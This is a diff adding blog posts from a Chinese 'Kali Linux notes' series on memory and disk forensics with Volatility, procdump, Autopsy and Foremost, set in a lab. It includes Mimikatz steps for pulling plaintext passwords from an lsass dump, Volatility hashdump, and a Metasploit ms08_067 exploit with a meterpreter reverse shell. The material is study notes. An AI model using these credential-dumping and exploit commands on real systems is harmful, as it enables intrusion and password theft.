@@ -240,6 +240,1005 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/" itemprop="url">Kali Linux笔记(一百一十七)：活取证和死取证</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T23:45:00+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-活取证"><a href="#1-活取证" class="headerlink" title="1. 活取证"></a>1. 活取证</h4><ul>
+<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
+<li>从内存还原文字<ul>
+<li>procdump：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a> <ul>
+<li>存在Linux版本，GitHub链接：<a href="https://github.com/Microsoft/ProcDump-for-Linux" target="_blank" rel="noopener">https://github.com/Microsoft/ProcDump-for-Linux</a></li>
+</ul>
+</li>
+<li>strings：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</a></li>
+<li><strong><code>🔺命令：procdump -ma notepad.exe notepad.dmp</code></strong>（记事本的进程）</li>
+<li><strong><code>🔺命令：strings notepad.dmp &gt; notepad.txt</code></strong>（只识别连续三个以上的ASCII码字符）</li>
+<li>其他文字处理程序也适用</li>
+</ul>
+</li>
+<li>从内存还原图片<ul>
+<li>远程桌面、画图工具、Virtualbox虚拟机（dump取虚拟机window XP SP3的图像）</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 memdump -p 1456 -D test</code></strong> </li>
+<li><strong><code>🔺命令：mv mstsc.dmp mstsc.data</code></strong></li>
+<li>Gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</li>
+</ul>
+</li>
+<li>从内存中提取明文密码<ul>
+<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
+<li><strong><code>🔺命令：Mimikatz</code></strong> </li>
+<li><strong><code>🔺命令：sekurlsa::minidump lsass.dmp</code></strong> </li>
+<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong> </li>
+</ul>
+</li>
+<li>Volatility的mimikatz插件<ul>
+<li><a href="https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py" target="_blank" rel="noopener">https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</a></li>
+</ul>
+</li>
+<li>Firefox浏览器审计工具<ul>
+<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --All</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验–从内存还原文字"><a href="#2-实验–从内存还原文字" class="headerlink" title="2. 实验–从内存还原文字"></a>2. 实验–从内存还原文字</h4><ul>
+<li>Window XP SP3<ul>
+<li>拷贝procdump到window XP SP3上</li>
+<li>找一段文字写入notepad中，<strong><code>🔺命令：netstat -nao</code></strong>查看进程是否有notepad.exe</li>
+<li><strong><code>🔺命令：procdump.exe -ma notepad.exe notepad.dmp</code></strong></li>
+<li><strong><code>🔺命令：strings.exe notepad.dmp &gt; notepad.txt</code></strong></li>
+<li>对比两个文件的内容，是否存在相同（搜索特征字符）</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验–从内存还原图片"><a href="#3-实验–从内存还原图片" class="headerlink" title="3. 实验–从内存还原图片"></a>3. 实验–从内存还原图片</h4><ul>
+<li>▲ 图片不同于图像，图像在软件中保存后，可以导出为图片</li>
+<li>Window XP SP3<ul>
+<li>截图工具 → 随意截取一张图片 → 保存图片到桌面 → 用画图工具打开</li>
+<li><strong><code>🔺命令：cmd → tasklist</code></strong><ul>
+<li>在Window XP SP3上暂不能执行此命令</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：procdump.exe -ma mspaint.exe mspaint.dmp</code></strong></li>
+<li>Win+R → mstsc → 远程连接一个机器</li>
+<li><strong><code>🔺命令：cmd → tasklist</code></strong></li>
+<li><strong><code>🔺命令：procdump.exe -ma mstsc.exe mstsc.dmp</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>从共享文件中拷贝mspaint.dmp和mstsc.dmp文件</li>
+<li><strong><code>🔺命令：apt-get install gimp</code></strong></li>
+<li>打开gimp</li>
+<li><strong><code>🔺命令：mv mspaint.dump mspaint.data</code></strong></li>
+<li><strong><code>🔺命令：mv mstsc.dump mstsc.data</code></strong></li>
+<li>gimp打开mstsc.data/mspaint.data</li>
+<li>调整Offset、Width、Height（高度一般不起作用，宽度一般其决定作用）</li>
+<li>▲ 2020.03.04 gimp通过滑块去移动会导致软件崩溃，只能通过值输入</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/gimp%E6%89%93%E5%BC%80%E5%86%85%E5%AD%98%E5%9B%BE%E7%89%87.png" alt="gimp打开内存图片"></p>
+<h4 id="4-实验–从内存提取明文密码"><a href="#4-实验–从内存提取明文密码" class="headerlink" title="4. 实验–从内存提取明文密码"></a>4. 实验–从内存提取明文密码</h4><ul>
+<li>Window XP SP3<ul>
+<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：cd /usr/share/mimikatz</code></strong></li>
+<li>压缩mimikatz x86为一个x86.zip文件</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>拷贝.x86到window XP SP3的机子上</li>
+<li>双击mimikatz打开</li>
+<li><strong><code>🔺命令：sekurlsa::</code></strong></li>
+<li><strong><code>🔺命令：sekurlsa::minidump lsa.dmp</code></strong></li>
+<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong></li>
+<li>查看dump下来的身份信息</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=cc53U-yoem8lUfoxmFbu2wXynjsFjLnBwEC3Si4GrjvAMVZi0GehgaJnJJSuvMt_a-86ajRPPkZdq5V6hdfOsLik7IbdzMRDgcpHfelW-f6eQWU0YlWGthKivPxBASWwcl_CdYKKhurBl9LH0eE&file_name=/logonPasswords%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF.png" alt="logonPasswords的身份信息"></p>
+<h4 id="5-实验–Volatility的mimikatz插件"><a href="#5-实验–Volatility的mimikatz插件" class="headerlink" title="5. 实验–Volatility的mimikatz插件"></a>5. 实验–Volatility的mimikatz插件</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 Github的链接失效，暂无法找到mimikatz.py，此模块未实验</li>
+<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
+<li>从Github上下载mimikatz插件到volatility的plugins库中</li>
+<li><strong><code>🔺命令：volatility -f xp.raw imageinfo</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile==WindowXPSP3x86 mimikatz</code></strong></li>
+<li>查看是否拿到密码</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-实验–Firefox浏览器审计工具"><a href="#6-实验–Firefox浏览器审计工具" class="headerlink" title="6. 实验–Firefox浏览器审计工具"></a>6. 实验–Firefox浏览器审计工具</h4><ul>
+<li>▲ 在未关机的情况下取证，找寻firefox使用的浏览信息</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --Passwords</code></strong>（目录可能不一样）</li>
+<li>查看是否可看到浏览器信息</li>
+</ul>
+</li>
+<li>▲ 2020.03.04 –All参数被去除</li>
+</ul>
+<h4 id="7-死取证"><a href="#7-死取证" class="headerlink" title="7. 死取证"></a>7. 死取证</h4><ul>
+<li>硬盘镜像<ul>
+<li>使用Kali光盘启动计算机创建硬盘镜像文件（位镜像的拷贝）</li>
+<li>留足存储镜像文件的存储空间</li>
+<li>Dc3dd（来自美国空军计算机犯罪中心）</li>
+<li>Dcfldd</li>
+<li>Guymager</li>
+<li>计算机取证技术参考数据集<ul>
+<li><a href="http://www.cfreds.nist.gov/Controlv1_0/control.dd" target="_blank" rel="noopener">http://www.cfreds.nist.gov/Controlv1_0/control.dd</a></li>
+</ul>
+</li>
+<li>DFF（Digital Forensics Framework）<ul>
+<li>Open Evidence  #红色表示已经删除的文件</li>
+<li>▲ Kali官方已经剔除DFF软件，也无法手动安装，只能去官网手动安装包下载</li>
+</ul>
+</li>
+<li>Autopsy<ul>
+<li>非常流行的硬盘镜像分析工具</li>
+<li>WebServer+客户端架构</li>
+</ul>
+</li>
+<li>Extundelete<ul>
+<li>适用于ext3、ext4文件系统的反删除工具</li>
+<li><strong><code>🔺命令：Extundelete [device-file] --restore-file [restore location]</code></strong> </li>
+</ul>
+</li>
+<li>iPhone Backup Analyzer<ul>
+<li>分析iTunes生成的iPhone手机备份文件，并非电话image</li>
+</ul>
+</li>
+<li>Foremost（美国开发）<ul>
+<li>从内存dump中恢复文档图片，支持raw、dd、iso、vmem、excel、doc等格式（图片非图像）</li>
+<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i 7.raw</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-实验–Guymager"><a href="#8-实验–Guymager" class="headerlink" title="8. 实验–Guymager"></a>8. 实验–Guymager</h4><ul>
+<li>Window 7光盘挂载Kali Linux，forensic mode启动（取证模式）</li>
+<li>启动Guymager（可能无发现硬盘，可以进行选择扫描尝试）</li>
+<li>选择要取证的硬盘 → 右键 → Acquire images<ul>
+<li>Linux dd raw image/Expert Withess Format,sub-format Guymager</li>
+<li>▲ 可以分成多个文件，并设置MD5/SHA-1/SHA-256的哈希验证</li>
+<li>Case Number 999（钥匙数字）</li>
+<li>Evidence Number 001（证据编号）</li>
+<li>Examiner mzt（证据人）</li>
+<li>Description server（描述）</li>
+<li>Image directory（保存路径）</li>
+<li>image filename（文件名）</li>
+<li>info filename（信息文件名）</li>
+</ul>
+</li>
+<li>Start</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=b530q0aJH5AM4mNQlrn-PR6sLYorGWiNy4-8AagL83_hKfdBeuyz-PbjcwbuRBCyTynYga6NWvnuXNew1n1lV8Y70cVCSlNJrhXlohJUe_HlBIqbMH2Jr0VUmDFNEk0&file_name=/Guymager%E5%8F%96%E8%AF%81.png" alt="Guymager取证"></p>
+<h4 id="9-实验–Autopsy"><a href="#9-实验–Autopsy" class="headerlink" title="9. 实验–Autopsy"></a>9. 实验–Autopsy</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 无法拷贝到control.dd文件，输入网址出现乱码</li>
+<li>拷贝准备好的control.dd文件到/root目录下</li>
+<li>autopsy启动服务端</li>
+<li>浏览器访问：<a href="http://localhost:9999/autopsy" target="_blank" rel="noopener">http://localhost:9999/autopsy</a></li>
+<li>NEW CASE → 添加信息（Case Name、Description、Investigator）→ NEW CASE</li>
+<li>ADD HOST → 填写主机信息</li>
+<li>ADD IMAGE → 镜像文件信息（Location、Type(分区还是整盘)、Import Method(一般为copy，move怕断电，Symlink怕移动链接失效)）</li>
+<li>Next → Data Integrity（镜像文件的MD5的计算）→ File System Details → ADD</li>
+<li>OK</li>
+<li>ANALYZE（一般位FILE ANALYSNS）→ 可对文件进行一定的还原</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-实验–Foremost"><a href="#10-实验–Foremost" class="headerlink" title="10. 实验–Foremost"></a>10. 实验–Foremost</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
+<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
+<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i xp.raw</code></strong></li>
+<li>output文件夹中查看提取的文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="11-网络取证"><a href="#11-网络取证" class="headerlink" title="11. 网络取证"></a>11. 网络取证</h4><ul>
+<li>▲ 网络取证请看&lt;&lt;协议分析&gt;&gt;<ul>
+<li>全流量镜像可以还原历史</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/" itemprop="url">Kali Linux笔记(一百一十六)：取证工具--Volatility</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T19:00:16+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-取证工具"><a href="#1-取证工具" class="headerlink" title="1. 取证工具"></a>1. 取证工具</h4><ul>
+<li>▲ 分析内存需要扎实的计算机系统功底</li>
+<li>分析内存<ul>
+<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong>  #文件信息，关注profile</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86</code></strong>  #数据库文件</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong>  #按虚内存地址查看注册表内容</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong>  #用户账号<ul>
+<li>注册表中Administrator对于SAM文件只有特殊的权限，无完全控制权限，可通过修改权限设置，添加父类子类继承选项赋予Administrator对SAM文件、其子文件以及其文件键值的完全控制权</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong>  #最后登陆的账号</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong>  #正在运行的程序、运行过多少次、最后一次运行时间等</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong>  #内存进程信息<ul>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong>  #dump进程内存</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong>  #注册表的蜂巢文件（SOFTWARE–操作系统+自安装软件信息）</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong>  #内存进程树信息</li>
+<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #命令行历史（类似history）</li>
+<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有网络连接<ul>
+<li>该命令对x86架构的机器不起作用</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有建立的网络连接</li>
+<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong>  #建立的IE连接</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong>  #提取哈希值</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
+<li>插件目录：/usr/lib/python2.7/dis-packages/volatility/plugins</li>
+<li>拷贝Dump内存文件xp.raw到Kali的机子上</li>
+<li>Volatility <ul>
+<li>-h：帮助功能列表</li>
+<li>-F：要分析文件</li>
+<li>–profile：操作系统类型</li>
+<li>-p：进程PID</li>
+<li>-D：dump内存到的目录</li>
+<li>-o：虚内存地址</li>
+<li>-k：注册表的键值</li>
+<li>-y：使用SYSTEM的虚地址</li>
+<li>-s：使用SAM的虚地址</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong> </li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong><ul>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong><ul>
+<li>十六进制查看：<strong><code>🔺命令：hexeditor 1456.dump</code></strong></li>
+<li>关键字符串：<strong><code>🔺命令：strings 1456.dump | grep password</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong></li>
+<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
+<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
+<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
+<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong></li>
+</ul>
+<h4 id="3-Volatility插件"><a href="#3-Volatility插件" class="headerlink" title="3. Volatility插件"></a>3. Volatility插件</h4><ul>
+<li>Firefoxhistory插件（Python脚本文件）<ul>
+<li>▲ 2020.03.04 因Window XP SP3中没有Firefox，此模块未实验</li>
+<li><a href="http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip" target="_blank" rel="noopener">http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip</a> </li>
+<li>插件地址：/usr/lib/python2.7/dist-packages/volatility/plugins/ </li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 firefoxhistory</code></strong> </li>
+</ul>
+</li>
+<li>USN日志记录插件<ul>
+<li>NTFS特性，用于跟踪硬盘内容变化（不具体记录变更内容）</li>
+<li><a href="https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</a> </li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 usnparser --output=csv --output-file=usn.csv</code></strong><ul>
+<li>▲ 2020.03.04 能输出文件，但文件没有任何信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Timeline插件<ul>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 timeliner</code></strong></li>
+<li>从多个位置收集大量系统活动信息，绘画时间线、分析</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-内存取证发现恶意软件"><a href="#4-内存取证发现恶意软件" class="headerlink" title="4. 内存取证发现恶意软件"></a>4. 内存取证发现恶意软件</h4><ul>
+<li>恶意程序分析包网站集合<ul>
+<li><a href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a></li>
+<li><a href="https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</a></li>
+<li>▲ 2020.03.04 上列程序包，已经多年未更新</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>启动Dumpit，保存文件为xp.raw</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>拷贝xp.raw到Kali上</li>
+<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 pstree</code></strong> #查看进程树</li>
+<li><strong><code>🔺命令：volatility connscan</code></strong>  #查看网络连接，查看可疑进程的PID</li>
+<li><strong><code>🔺命令：volatility getsids -p 可疑进程的PID（可多个）</code></strong>  #查看进程的SID<ul>
+<li>正常的情况下，svchost的权限无SYSTEM权限，权限数量一般一样</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：volatility dlllist -p 111,222</code></strong>  #查看调动库文件</li>
+<li><strong><code>🔺命令：volatility malfind -p 111,222 -D test</code></strong>  #检查结果查毒<ul>
+<li>病毒文件标志<ul>
+<li>标志：PAGE_EXECUTE_READWRITE</li>
+<li>可执行文件：PE程序 -&gt; 在十六进制中为MZ开头</li>
+<li>内存地址：内存地址多块，存在多个内存地址空间</li>
+<li>查看文件类型：可执行程序还是数据（查看文件类型：file *）</li>
+</ul>
+</li>
+<li>杀毒软件查杀<ul>
+<li>拷贝单个文件到有杀毒软件的系统，查看是否被查杀</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 恶意程序<ul>
+<li>体积小：基本上调系统的动态链接库，使自己的体积小，但兼容性差，到别的操作系统可能无法执行</li>
+<li>体积大：基本上调自己的动态链接库，体积大，但兼容性好，可到别的操作系统执行</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/" itemprop="url">Kali Linux笔记(一百一十五)：取证科学、分类、原则、方法、工具</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
